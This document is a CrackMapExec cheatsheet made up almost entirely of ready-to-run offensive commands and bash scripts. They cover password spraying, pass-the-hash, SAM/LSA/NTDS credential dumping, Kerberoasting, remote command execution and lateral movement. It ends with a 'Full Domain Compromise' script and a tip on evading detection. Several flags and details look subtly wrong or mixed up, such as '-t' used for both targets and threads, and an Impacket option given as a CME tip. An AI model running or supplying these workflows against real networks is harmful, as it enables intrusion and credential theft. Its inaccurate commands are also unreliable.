---
tool_name: "crackmapexec"
display_name: "CrackMapExec Cheatsheet"
mitre_tactic: "defense_evasion"
mitre_tactic_id: "TA0005"
mitre_subcategory: "pass_the_hash"
version: "5.4.0"
---

# CrackMapExec Cheatsheet

## Quick Reference

### Authentication

```bash
# Password
crackmapexec smb 192.168.1.0/24 -u admin -p password123

# Pass-the-Hash
crackmapexec smb 192.168.1.0/24 -u admin -H 'aad3b435b51404ee...'

# Kerberos
crackmapexec smb 192.168.1.0/24 -u admin -k

# No password (null session)
crackmapexec smb 192.168.1.0/24 -u '' -p ''
```

---

## Protocol Modules

### SMB

```bash
# Host discovery
crackmapexec smb 192.168.1.0/24

# Share enumeration
crackmapexec smb 192.168.1.0/24 -u admin -p pass --shares

# Users enumeration
crackmapexec smb 192.168.1.0/24 -u admin -p pass --users

# Groups enumeration
crackmapexec smb 192.168.1.0/24 -u admin -p pass --groups

# Local groups
crackmapexec smb 192.168.1.0/24 -u admin -p pass --local-groups

# Password policy
crackmapexec smb 192.168.1.0/24 -u admin -p pass --password-policy

# SAM dump
crackmapexec smb 192.168.1.1 -u admin -p pass --sam

# LSA dump
crackmapexec smb 192.168.1.1 -u admin -p pass --lsa

# NTDS dump
crackmapexec smb 192.168.1.1 -u admin -p pass --ntds

# Mimikatz
crackmapexec smb 192.168.1.1 -u admin -p pass --mimikatz

# Command execution (cmd)
crackmapexec smb 192.168.1.1 -u admin -p pass -x "whoami"

# Command execution (PowerShell)
crackmapexec smb 192.168.1.1 -u admin -p pass -X "Get-Process"

# Relay list generation
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt

# SMB server for hash capture
crackmapexec smb 192.168.1.0/24 --smb-server /share

# Spider shares
crackmapexec smb 192.168.1.1 -u admin -p pass --spider shares.txt

# Test connectivity
crackmapexec smb 192.168.1.0/24 --gen-relay-list /dev/null
```

### LDAP

```bash
# Basic enumeration
crackmapexec ldap 192.168.1.0/24 -u admin -p pass

# Users
crackmapexec ldap 192.168.1.0/24 -u admin -p pass --users

# Groups
crackmapexec ldap 192.168.1.0/24 -u admin -p pass --groups

# BloodHound collection
crackmapexec ldap 192.168.1.0/24 -u admin -p pass --bloodhound

# Kerberoasting
crackmapexec ldap 192.168.1.0/24 -u admin -p pass --kerberoast hashes.txt

# AS-REP Roasting
crackmapexec ldap 192.168.1.0/24 -u admin -p pass --asreproast asrep.txt

# Custom LDAP query
crackmapexec ldap 192.168.1.1 -u admin -p pass --ldap-base "DC=domain,DC=local"

# Delegate users
crackmapexec ldap 192.168.1.1 -u admin -p pass --get-delegation-users

# Set SPN
crackmapexec ldap 192.168.1.1 -u admin -p pass --set-spn victimsvc targetuser
```

### WINRM

```bash
# Basic connection
crackmapexec winrm 192.168.1.1 -u admin -p pass

# Command execution
crackmapexec winrm 192.168.1.1 -u admin -p pass -X "whoami"

# PS Remoting
crackmapexec winrm 192.168.1.1 -u admin -p pass --remote-ps

# Execute with cmd
crackmapexec winrm 192.168.1.1 -u admin -p pass -x "ipconfig"
```

### SSH

```bash
# Basic connection
crackmapexec ssh 192.168.1.0/24 -u root -p password

# Key authentication
crackmapexec ssh 192.168.1.0/24 -u root --key /path/to/key

# Command execution
crackmapexec ssh 192.168.1.1 -u root -p pass -x "id"
```

### FTP

```bash
# Basic connection
crackmapexec ftp 192.168.1.0/24 -u admin -p pass

# Anonymous access
crackmapexec ftp 192.168.1.0/24 -u anonymous -p ''
```

### MSSQL

```bash
# Basic connection
crackmapexec mssql 192.168.1.0/24 -u sa -p password

# Windows auth
crackmapexec mssql 192.168.1.0/24 -u admin -p pass --windows-auth

# Execute query
crackmapexec mssql 192.168.1.1 -u sa -p pass -Q "SELECT @@VERSION"

# Enable xp_cmdshell
crackmapexec mssql 192.168.1.1 -u sa -p pass --xp-cmdshell

# Execute via xp_cmdshell
crackmapexec mssql 192.168.1.1 -u sa -p pass -x "whoami"
```

### RDP

```bash
# Basic connection
crackmapexec rdp 192.168.1.0/24 -u admin -p pass

# NLA check
crackmapexec rdp 192.168.1.0/24 --nla-check

# Screen shot
crackmapexec rdp 192.168.1.1 -u admin -p pass --screenshot
```

### WMI

```bash
# Basic connection
crackmapexec wmi 192.168.1.0/24 -u admin -p pass

# Command execution
crackmapexec wmi 192.168.1.1 -u admin -p pass -x "whoami"
```

---

## Target Specification

```bash
# Single host
crackmapexec smb 192.168.1.100

# CIDR range
crackmapexec smb 192.168.1.0/24

# IP range
crackmapexec smb 192.168.1.1-100

# File with targets
crackmapexec smb -t targets.txt

# Exclude targets
crackmapexec smb 192.168.1.0/24 --exclude 192.168.1.1

# Domain controller
crackmapexec smb dc1.contoso.com -u admin -p pass

# IPv6
crackmapexec smb dead:beef::1 -u admin -p pass
```

---

## Credential Files

```bash
# Username list
crackmapexec smb 192.168.1.0/24 -U users.txt -p password

# Password list
crackmapexec smb 192.168.1.0/24 -u admin -P passwords.txt

# Username:Password list
crackmapexec smb 192.168.1.0/24 -C creds.txt

# Hash list
crackmapexec smb 192.168.1.0/24 -u admin -H hashes.txt

# Username:Hash list
crackmapexec smb 192.168.1.0/24 -C hashes_creds.txt
```

---

## Performance Options

```bash
# Thread count
crackmapexec smb 192.168.1.0/24 -t 100

# Timeout
crackmapexec smb 192.168.1.0/24 --timeout 10

# Connection timeout
crackmapexec smb 192.168.1.0/24 --conn-timeout 5

# SMB timeout
crackmapexec smb 192.168.1.0/24 --smb-timeout 10

# Wait between connections
crackmapexec smb 192.168.1.0/24 --jitter 0.5
```

---

## Output Options

```bash
# Output to file
crackmapexec smb 192.168.1.0/24 -o results.txt

# Verbose
crackmapexec smb 192.168.1.0/24 -v

# Very verbose
crackmapexec smb 192.168.1.0/24 -vv

# JSON output
crackmapexec smb 192.168.1.0/24 --json

# Grepable output
crackmapexec smb 192.168.1.0/24 --grep

# Disable color
crackmapexec smb 192.168.1.0/24 --no-color
```

---

## Credential Attacks

### Password Spraying

```bash
# Single password, multiple users
crackmapexec smb 192.168.1.0/24 -U users.txt -p 'Company123!'

# Multiple passwords, single user
crackmapexec smb 192.168.1.0/24 -u admin -P passwords.txt

# Multiple users, multiple passwords
crackmapexec smb 192.168.1.0/24 -C creds.txt
```

### Pass-the-Hash

```bash
# Single hash
crackmapexec smb 192.168.1.0/24 -u admin -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'

# Hash file
crackmapexec smb 192.168.1.0/24 -u admin -H hashes.txt

# Execute after finding valid hash
crackmapexec smb 192.168.1.1 -u admin -H 'LM:NT' -x "whoami"
```

### Overpass-the-Hash

```bash
# Get Kerberos ticket from hash
crackmapexec smb 192.168.1.0/24 -u admin -H 'LM:NT' --export-kerberos ticket.kirbi

# Use ticket with Impacket
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass contoso.com/admin@192.168.1.100
```

### AS-REP Roasting

```bash
# Find AS-REP roastable accounts
crackmapexec ldap 192.168.1.0/24 -u admin -p pass --asreproast asrep.txt

# Crack with Hashcat
hashcat -m 18200 asrep.txt wordlist.txt
```

### Kerberoasting

```bash
# Kerberoast
crackmapexec ldap 192.168.1.0/24 -u admin -p pass --kerberoast kerberoast.txt

# Crack with Hashcat
hashcat -m 13100 kerberoast.txt wordlist.txt
```

---

## Lateral Movement

### Pass-the-Hash Chain

```bash
# 1. Find valid creds
crackmapexec smb 192.168.1.0/24 -u admin -p password

# 2. Use found creds to move
crackmapexec smb 192.168.1.200 -u admin -H 'LM:NT' -x "whoami"

# 3. Dump credentials
crackmapexec smb 192.168.1.200 -u admin -H 'LM:NT' --sam

# 4. Use new creds to move further
crackmapexec smb 192.168.1.0/24 -u admin2 -H 'new_LM:new_NT' --shares
```

### RDP Lateral Movement

```bash
# Find RDP access
crackmapexec rdp 192.168.1.0/24 -u admin -p pass

# Screen shot to verify
crackmapexec rdp 192.168.1.100 -u admin -p pass --screenshot
```

### WinRM Lateral Movement

```bash
# Find WinRM access
crackmapexec winrm 192.168.1.0/24 -u admin -p pass

# Execute commands
crackmapexec winrm 192.168.1.100 -u admin -p pass -X "Get-Process"
```

---

## Enumeration Workflows

### Full Domain Enumeration

```bash
# 1. Find DC
crackmapexec smb 192.168.1.0/24 --gen-relay-list /dev/null 2>&1 | grep "DC:"

# 2. Enumerate users
crackmapexec ldap 192.168.1.1 -u admin -p pass --users > users.txt

# 3. Enumerate groups
crackmapexec ldap 192.168.1.1 -u admin -p pass --groups > groups.txt

# 4. BloodHound collection
crackmapexec ldap 192.168.1.1 -u admin -p pass --bloodhound -c All

# 5. Password policy
crackmapexec smb 192.168.1.1 -u admin -p pass --password-policy

# 6. Kerberoast
crackmapexec ldap 192.168.1.1 -u admin -p pass --kerberoast kerberoast.txt
```

### Network Discovery

```bash
# Quick scan
crackmapexec smb 192.168.1.0/24

# Detailed scan
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt

# With credentials
crackmapexec smb 192.168.1.0/24 -u admin -p pass --shares --users
```

### Credential Harvesting

```bash
# Dump SAM on all accessible hosts
for host in $(cat targets.txt); do
  crackmapexec smb $host -u admin -p pass --sam >> sam_dump.txt 2>&1
done

# Dump LSA on all accessible hosts
for host in $(cat targets.txt); do
  crackmapexec smb $host -u admin -p pass --lsa >> lsa_dump.txt 2>&1
done
```

---

## Automation Scripts

### Credential Spray Script

```bash
#!/bin/bash
# spray.sh

SUBNET="192.168.1"
USERS=("admin" "administrator" "user1" "user2")
PASSWORDS=("Password1" "password123" "Company123!" "admin")

for user in "${USERS[@]}"; do
  for pass in "${PASSWORDS[@]}"; do
    echo "[*] Testing $user:$pass"
    crackmapexec smb $SUBNET.0/24 -u $user -p $pass 2>/dev/null | grep "[+]" >> valid_creds.txt
  done
done

echo "[+] Results in valid_creds.txt"
cat valid_creds.txt
```

### Lateral Movement Script

```bash
#!/bin/bash
# lateral.sh

DC="192.168.1.1"
TARGETS="targets.txt"

while IFS= read -r target; do
  echo "[*] Testing $target"
  
  # Try password
  result=$(crackmapexec smb $target -u admin -p password 2>&1 | grep "[+]")
  if [ ! -z "$result" ]; then
    echo "[+] Found access: $result"
    crackmapexec smb $target -u admin -p password -x "whoami" 2>&1 >> access.txt
  fi
  
  # Try hash
  result=$(crackmapexec smb $target -u admin -H 'LM:NT' 2>&1 | grep "[+]")
  if [ ! -z "$result" ]; then
    echo "[+] Found hash access: $result"
    crackmapexec smb $target -u admin -H 'LM:NT' -x "whoami" 2>&1 >> access.txt
  fi
done < $TARGETS
```

### Full Domain Compromise Script

```bash
#!/bin/bash
# compromise.sh

DOMAIN="contoso.com"
DC="192.168.1.1"
SUBNET="192.168.1"
USER="admin"
PASS="password"

echo "[+] Phase 1: Enumeration"
crackmapexec smb $SUBNET.0/24 > hosts.txt
crackmapexec ldap $DC -u $USER -p $PASS --users > users.txt
crackmapexec ldap $DC -u $USER -p $PASS --bloodhound -c All

echo "[+] Phase 2: Credential Testing"
crackmapexec smb $SUBNET.0/24 -U users.txt -p $PASS > valid_creds.txt

echo "[+] Phase 3: Credential Extraction"
while IFS= read -r host; do
  crackmapexec smb $host -u $USER -p $PASS --sam >> sam_dump.txt 2>&1
  crackmapexec smb $host -u $USER -p $PASS --lsa >> lsa_dump.txt 2>&1
done < hosts.txt

echo "[+] Phase 4: Lateral Movement"
# Use extracted credentials for further movement
echo "[+] Compromise complete. Review output files."
```

---

## Output Parsing

### Extract Valid Credentials

```bash
# Parse successful logons
crackmapexec smb 192.168.1.0/24 -u admin -p pass 2>&1 | grep "\[+\]"

# Extract just the hostnames
crackmapexec smb 192.168.1.0/24 -u admin -p pass 2>&1 | grep "\[+\]" | cut -d' ' -f1

# Count successful logons
crackmapexec smb 192.168.1.0/24 -u admin -p pass 2>&1 | grep -c "\[+\]"
```

### Extract Hashes

```bash
# From SAM dump
crackmapexec smb 192.168.1.1 -u admin -p pass --sam 2>&1 | grep ":" | cut -d' ' -f2

# From LSA dump
crackmapexec smb 192.168.1.1 -u admin -p pass --lsa 2>&1 | grep ":" | cut -d' ' -f2
```

### JSON Output Processing

```bash
# Save as JSON
crackmapexec smb 192.168.1.0/24 -u admin -p pass --json > results.json

# Parse with jq
cat results.json | jq '.[] | select(.cred_success == true) | .host'
```

---

## Integration

### With Impacket

```bash
# Find valid creds
crackmapexec smb 192.168.1.0/24 -u admin -p pass

# Use with Impacket
impacket-psexec contoso.com/admin:pass@192.168.1.100
impacket-secretsdump contoso.com/admin:pass@192.168.1.100
```

### With Evil-WinRM

```bash
# Find valid creds
crackmapexec winrm 192.168.1.0/24 -u admin -p pass

# Use with Evil-WinRM
evil-winrm -i 192.168.1.100 -u admin -p pass
```

### With FreeRDP

```bash
# Find valid RDP creds
crackmapexec rdp 192.168.1.0/24 -u admin -p pass

# Use with FreeRDP
xfreerdp /v:192.168.1.100 /u:admin /p:pass /cert-ignore
```

### With BloodHound

```bash
# Collect BloodHound data
crackmapexec ldap 192.168.1.1 -u admin -p pass --bloodhound -c All

# Import into BloodHound GUI
# Point to Neo4j database and import JSON files
```

---

## Quick Commands

| Task | Command |
|------|---------|
| Find SMB hosts | `cme smb 192.168.1.0/24` |
| Test creds | `cme smb 192.168.1.0/24 -u admin -p pass` |
| Pass-the-Hash | `cme smb 192.168.1.0/24 -u admin -H 'LM:NT'` |
| Dump SAM | `cme smb 192.168.1.1 -u admin -p pass --sam` |
| Dump LSA | `cme smb 192.168.1.1 -u admin -p pass --lsa` |
| Dump NTDS | `cme smb 192.168.1.1 -u admin -p pass --ntds` |
| Execute cmd | `cme smb 192.168.1.1 -u admin -p pass -x "whoami"` |
| Execute PS | `cme smb 192.168.1.1 -u admin -p pass -X "Get-Process"` |
| Enumerate shares | `cme smb 192.168.1.0/24 -u admin -p pass --shares` |
| Enumerate users | `cme smb 192.168.1.0/24 -u admin -p pass --users` |
| BloodHound | `cme ldap 192.168.1.1 -u admin -p pass --bloodhound` |
| Kerberoast | `cme ldap 192.168.1.1 -u admin -p pass --kerberoast` |
| AS-REP Roast | `cme ldap 192.168.1.1 -u admin -p pass --asreproast` |
| Relay list | `cme smb 192.168.1.0/24 --gen-relay-list targets.txt` |
| WinRM exec | `cme winrm 192.168.1.1 -u admin -p pass -X "whoami"` |
| RDP check | `cme rdp 192.168.1.0/24 -u admin -p pass` |

---

## Tips

1. **Use `-t` for speed:** Increase threads for faster scanning (`-t 100`).
2. **Output to file:** Always save results with `-o` for later analysis.
3. **Combine with Impacket:** Use CME for discovery, Impacket for exploitation.
4. **Check SMBv1:** Some attacks require SMBv1 (`--smb2support` to force SMBv2).
5. **Null sessions:** Test for null session access (`-u '' -p ''`).
6. **Log rotation:** Use `--json` output for automated parsing.
7. **Rate limiting:** Use `--jitter` to avoid detection on sensitive networks.
8. **Exclude hosts:** Use `--exclude` to skip critical infrastructure.
